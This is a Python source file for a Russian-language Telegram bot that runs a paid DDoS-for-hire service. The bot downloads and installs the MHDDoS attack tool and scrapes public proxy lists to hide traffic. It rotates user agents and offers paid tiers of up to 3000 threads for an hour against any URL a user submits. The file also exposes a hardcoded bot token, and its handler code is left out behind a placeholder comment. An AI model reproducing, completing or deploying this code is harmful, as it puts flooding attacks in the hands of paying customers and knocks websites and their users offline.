#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS БОТ — С АВТОУСТАНОВКОЙ ВСЕХ ЗАВИСИМОСТЕЙ
"""

import asyncio
import os
import sys
import subprocess
import json
import time
import random
import requests
import re
import zipfile
import io
import html
from datetime import datetime, timedelta
from typing import Dict, List

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram import F
from aiohttp import web

# ==============================
# КОНФИГУРАЦИЯ
# ==============================
BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
ADMINS = [8264264137]

MH_DDOS_PATH = "start.py"
PROXIES_FILE = "proxies.txt"
DATA_FILE = "users.json"
UA_FILE = "user_agents.txt"

WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"

# ==============================
# АВТОЗАГРУЗКА MHDDOS И УСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
# ==============================
def ensure_mhddos():
    """Скачивает MHDDoS, если он не найден, и устанавливает все зависимости"""
    if os.path.exists(MH_DDOS_PATH):
        return
    print("⬇️ MHDDoS не найден, скачиваю...")
    url = "https://github.com/MatrixTM/MHDDoS/archive/refs/heads/main.zip"
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            with zipfile.ZipFile(io.BytesIO(r.content)) as z:
                for file in z.namelist():
                    if file.startswith("MHDDoS-main/") and not file.endswith("/"):
                        new_name = file.replace("MHDDoS-main/", "")
                        if "/" in new_name:
                            os.makedirs(os.path.dirname(new_name), exist_ok=True)
                        data = z.read(file)
                        with open(new_name, "wb") as f:
                            f.write(data)
            print("✅ MHDDoS загружен и распакован.")
            install_all_dependencies()
        else:
            print(f"❌ Не удалось скачать MHDDoS, статус {r.status_code}")
    except Exception as e:
        print(f"❌ Ошибка загрузки: {e}")

def install_all_dependencies():
    """Устанавливает все зависимости из официального requirements.txt MHDDoS"""
    # Список пакетов из requirements.txt репозитория MatrixTM/MHDDoS[reference:1]
    packages = [
        "cloudscraper==1.2.71",
        "certifi==2024.7.4",
        "dnspython==2.6.1",
        "requests==2.33.0",
        "impacket==0.10.0",
        "psutil>=5.9.3",
        "icmplib>=2.1.1",
        "pyasn1==0.6.3",
        "yarl>=1.7.2",
        "git+https://github.com/MatrixTM/PyRoxy.git"
    ]
    for pkg in packages:
        try:
            print(f"📦 Устанавливаю {pkg}...")
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print(f"✅ {pkg} установлен")
        except Exception as e:
            print(f"⚠️ Не удалось установить {pkg}: {e}")

ensure_mhddos()

# ==============================
# ОСТАЛЬНОЙ КОД (user-agent, тарифы, прокси, атака, обработчики)
# ==============================
try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except:
    UA_AVAILABLE = False

def get_user_agents() -> List[str]:
    if os.path.exists(UA_FILE):
        with open(UA_FILE, "r", encoding="utf-8") as f:
            ua = [line.strip() for line in f if line.strip()]
            if len(ua) > 10:
                return ua
    base = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    if UA_AVAILABLE:
        try:
            ua = UserAgent()
            for _ in range(100):
                base.append(ua.random)
        except:
            pass
    final = list(set(base))
    with open(UA_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(final))
    return final

USER_AGENTS = get_user_agents()

def get_random_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"

# ==============================
# ТАРИФЫ И ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ
# ==============================
TIERS = {
    "free": {"name": "🐢 Бесплатный", "max_threads": 100, "max_duration": 60},
    "medium": {"name": "⚡ Средний", "max_threads": 500, "max_duration": 600},
    "pro": {"name": "💥 Мощный", "max_threads": 3000, "max_duration": 3600}
}
DEFAULT_TIER = "free"

def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
        save_users(users)
    return users[uid]

def set_user_tier(user_id, tier):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
    users[uid]["tier"] = tier
    if tier != "free":
        users[uid]["expiry"] = (datetime.now() + timedelta(days=30)).isoformat()
    else:
        users[uid]["expiry"] = None
    save_users(users)

def is_admin(user_id):
    return user_id in ADMINS

# ==============================
# ПРОКСИ
# ==============================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/http.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/https.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks4.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks5.txt",
]

def fetch_proxies():
    all_proxies = []
    seen = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and ':' in line:
                        if line not in seen:
                            seen.add(line)
                            all_proxies.append(line)
        except:
            pass
    return all_proxies

def validate_proxies(proxy_list):
    valid = []
    for proxy in proxy_list[:50]:
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
            if r.status_code == 200:
                valid.append(proxy)
        except:
            pass
    return valid

def update_proxies():
    raw = fetch_proxies()
    if raw:
        valid = validate_proxies(raw)
        if valid:
            with open(PROXIES_FILE, "w") as f:
                f.write("\n".join(valid))
            return len(valid)
    return 0

# ==============================
# АТАКА
# ==============================
active_attacks = {}

async def run_attack(user_id, method, url, threads, duration):
    update_proxies()
    if not os.path.exists(MH_DDOS_PATH):
        await asyncio.get_event_loop().run_in_executor(None, ensure_mhddos)
        if not os.path.exists(MH_DDOS_PATH):
            raise Exception("MHDDoS не найден")
    if not os.path.exists(PROXIES_FILE):
        open(PROXIES_FILE, 'a').close()
    
    # Проверяем, установлен ли PyRoxy (основная зависимость)[reference:2]
    try:
        import PyRoxy
    except ImportError:
        print("⚠️ PyRoxy не найден, устанавливаю...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "git+https://github.com/MatrixTM/PyRoxy.git"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("✅ PyRoxy установлен")
        except Exception as e:
            raise Exception(f"Не удалось установить PyRoxy: {e}")
    
    cmd = ["python", MH_DDOS_PATH, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.path.dirname(os.path.abspath(__file__)))
    return process

# ... (весь остальной код обработчиков и клавиатур здесь, он не изменился) ...

# ==============================
# ВЕБХУК-СЕРВЕР
# ==============================
async def handle_webhook(request):
    try:
        update_data = await request.json()
        update = types.Update(**update_data)
        await dp.feed_update(bot, update)
        return web.Response(text="OK")
    except Exception as e:
        if "query is too old" not in str(e):
            print(f"Webhook error: {e}")
        return web.Response(status=500)

async def on_startup():
    await bot.delete_webhook()
    await bot.set_webhook(WEBHOOK_URL)
    print(f"✅ Вебхук установлен на {WEBHOOK_URL}")

async def main():
    await on_startup()
    print("✅ Бот запущен через вебхук")
    app = web.Application()
    app.router.add_post("/webhook", handle_webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=8080)
    await site.start()
    print("🚀 Сервер запущен на порту 8080")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
